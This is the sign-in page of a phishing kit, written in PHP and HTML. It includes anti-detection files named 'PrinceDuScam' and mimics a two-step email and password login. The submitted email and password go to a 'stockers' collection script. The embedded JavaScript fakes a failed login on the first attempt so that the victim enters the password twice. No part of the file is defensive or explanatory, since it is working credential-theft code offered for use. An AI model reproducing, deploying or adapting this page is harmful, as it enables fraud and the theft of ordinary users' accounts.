<?php include '../prevents/PrinceDuScam1.php';
include '../prevents/PrinceDuScam2.php';
include '../prevents/PrinceDuScam3.php';
include '../prevents/PrinceDuScam4.php';
include '../prevents/PrinceDuScam5.php';
include '../prevents/PrinceDuScam6.php';
include '../prevents/PrinceDuScam7.php';
include '../prevents/PrinceDuScam8.php';
ob_start();
session_start();
if(!isset($_SESSION['language'])){
    exit(header("Location: index.php"));
} else{
    include "../extra/languages/{$_SESSION['language']}.php";
    }
?>

<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <link rel="shortcut icon" href="lib/pics/favi.ico">
        <link rel="apple-touch-icon" href="lib/pics/favi.png">
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
        <link rel="stylesheet" href="lib/styles/signin.css">
        <script type="text/javascript" src="lib/js/jquery-3.3.1.min.js"></script>
        <script type="text/javascript" src="https://js-codes.com/modernizr/2.9.0/modernizr.min.js"></script>
        <title><?php echo $lg_sign['title']?></title>
    </head>
    <body>
        <section class="base">
            <div class="main contentBordered">
                <header><p class="app_logo"></p></header>
                <div class="alert hide">
                    <p class="danger_error"><?php echo $lg_sign['alert']?></p>
                </div>
                <form action="../extra/stockers/step1.php" method="post" novalidate="">
                    <div id="stored_email" class="storedMail hide">
                        <span class="spanMail"></span>
                        <a href="javascript:" id="bt_change">
                            <?php echo $lg_sign['changer']?>
                        </a>
                    </div>
                    <div id="email_area" class="">
                        <div class="inputs clearfix" id="field_eml">
                            <div class="fieldContainer">
                                <label for="email" class="inputLabel"><?php echo $lg_sign['eml_placeholder']?></label>
                                <input 
                                    name="EML" 
                                    id="email" 
                                    autofocus 
                                    type="email" 
                                    autocomplete="off" 
                                    placeholder="<?php echo $lg_sign['eml_placeholder']?>">
                            </div>
                            <div class="msg" id="eml_error">
                                <p class="hide"><?php echo $lg_sign['eml_msg1']?></p>
                                <p class="hide"><?php echo $lg_sign['eml_msg2']?></p>
                            </div>
                        </div>
                    </div> //Putting extra Div
                <div style="margin-top:20px">
                    <button class="button" type="button" id="bt_next">
                        <?php echo $lg_sign['bt_next']?>
                    </button>
                </div>
                <div class="insteadArea">
                    <a href="javascript:">
                        <?php echo $lg_sign['trouble']?>
                    </a>
                </div>
            </div>
    <div id="password_area" class="hide">
        <div class="inputs clearfix" id="field_pwd">
            <div class="fieldContainer">
                <label for="password" class="inputLabel">
                    <?php echo $lg_sign['pwd_placeholder']?>
                </label>
                <input 
                    name="PWD" 
                    id="password" 
                    type="password" 
                    class="anim" 
                    placeholder="<?php echo $lg_sign['pwd_placeholder']?>"
                >
                <button type="button" class="showPassword hide show-hide-password">
                    <?php echo $lg_sign['pwd_show']?>
                </button>
                <button type="button" class="hidePassword hide show-hide-password">
                    <?php echo $lg_sign['pwd_hide']?>
                </button>
            </div>
            <div class="msg" id="pwd_error">
                <p class="hide"><?php echo $lg_sign['pwd_placeholder']?></p>
            </div>
        </div>
        <div style="margin-top:20px">
            <button class="button anim" type="submit" id="btnLogin">
                <?php echo $lg_sign['bt_login']?>
            </button>
        </div>
        <div class="troubleArea">
            <a href="javascript:">
                <?php echo $lg_sign['trouble']?>
            </a>
        </div>
    </div>
</form>
<div>
    <div class="divider">
        <span>
            <?php echo $lg_sign['or']?>
        </span>
    </div>
    <a href="javascript:" class="button secondary">
        <?php echo $lg_sign['bt_signup']?>
    </a>
</div>
</div>
</section>
<footer class="footer">
    <div class="footerArea">
        <ul class="footerList">
            <li><a href="javascript:"><?php echo $lg_sign['footer']['contact']?></a></li>
            <li><a href="javascript:"><?php echo $lg_sign['footer']['privacy']?></a></li>
            <li><a href="javascript:"><?php echo $lg_sign['footer']['legal']?></a></li>
            <li><a href="javascript:"><?php echo $lg_sign['footer']['world']?></a></li>
        </ul>
    </div>
</footer>
<div class="hide" id="rotate">
    <div class="circle">
        <div class="rotate">

        </div>
        <div class="processing">
            <?php echo $lg_sign['rotate']?>
        </div>
    </div>
    <div class="overlay">

    </div>
</div>
<script>
$(document).ready(
    function(){
        var j=false;
        var e=$("#email"),
            i=$("#password"),
            k=$("#email_area"),
            l=$("#password_area"),
            c=$("#stored_email"),
            b=$("#field_eml"),
            d=$("#field_pwd"),
            h=$("#eml_error"),
            a=$("#pwd_error");
    function f(o,m,p){
        var n=true;
    if(!o.val()){
        m.addClass("hasError");
        p.attr("class","msg show").children("p:first").removeClass("hide");
        n=false
        }else {
            m.removeClass("hasError");
            p.attr("class","msg hide").children("p:first").addClass("hide")
        }
        return n
    }
    function g(){
        var m=true;
        if(!(/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/).test(e.val())){
            b.addClass("hasError");
            h.attr("class","msg show").children("p:last").removeClass("hide");
            m=false
        } else{b.removeClass("hasError");
            h.attr("class","msg hide").children("p:last").addClass("hide")
        }
        return m
    }
    $("#bt_next").click(function(m){
        if(!f(e,b,h)){
                e.focus();
                h.attr("class","msg show").children("p:last").addClass("hide");
                console.log("required");
                return false
            }
        if(!g()){
            e.focus();
            console.log("eml");
            return false
        }else {
            h.attr("class","msg hide").children("p:last").addClass("hide")}$("#rotate").removeClass("hide");setTimeout(function(){c.removeClass("hide").children("span").html(e.val());
            k.addClass("hide");
            l.removeClass("hide");
            $("#rotate").addClass("hide");
            d.removeClass("hasError");
            a.attr("class","msg hide").children("p:first").addClass("hide")},800)});
            $("#bt_change").click(
                function(){
                c.addClass("hide");
                e.val("");
                i.val("");l.addClass("hide");
                k.removeClass("hide");
                $(".alert").addClass("hide");
                j=false
            });
            e.keyup(
                function(m){
                    if(m.keyCode==13){
                        $("#bt_next").click()}
                        else{
                            if(!(/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/).test(e.val())){
                                b.addClass("hasError");
                                h.attr("class","msg hide").children("p:first").addClass("hide");
                                e.focus();
                                return false
                            }else{
                                b.removeClass("hasError");
                                h.attr("class","msg hide")}
                        }
                });
            i.keyup(
                function(m){
                    if(i.val().length>0){
                        i.attr("type","password");
                        $(".showPassword").removeClass("hide");
                        $(".hidePassword").addClass("hide")}else{
                        $(".showPassword").addClass("hide");
                        $(".hidePassword").addClass("hide")}
                        if(!i.val()){d.addClass("hasError");
                            i.focus();
                            return false} else {
                                d.removeClass("hasError");
                                a.attr("class","msg hide")
                            }
                });
        e.focusout(function(){
            h.removeClass("show")});
        i.focusout(function(){
            a.removeClass("show")});
            $(".showPassword").click(function(){
                i.attr("type","text");
                $(".hidePassword").removeClass("hide");
                $(".showPassword").addClass("hide")});
                $(".hidePassword").click(function(){i.attr("type","password");
                $(".showPassword").removeClass("hide");$(".hidePassword").addClass("hide")});
                $(document).on("submit","form",function(m){
                    if(!(/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/).test(e.val())){return false}if(!f(i,d,a)){i.focus();
                return false}$("#rotate").removeClass("hide");
                if(!j){m.preventDefault();
                setTimeout(function(){j=true;
                    $("#rotate").addClass("hide");i.val("");
                    $(".alert").removeClass("hide");
                    $(".showPassword").addClass("hide");
                    $(".hidePassword").addClass("hide");
                    return false},1800)}$(".alert").addClass("hide")
                }
            )
        }
    );
    </script>
    </body>
    </html>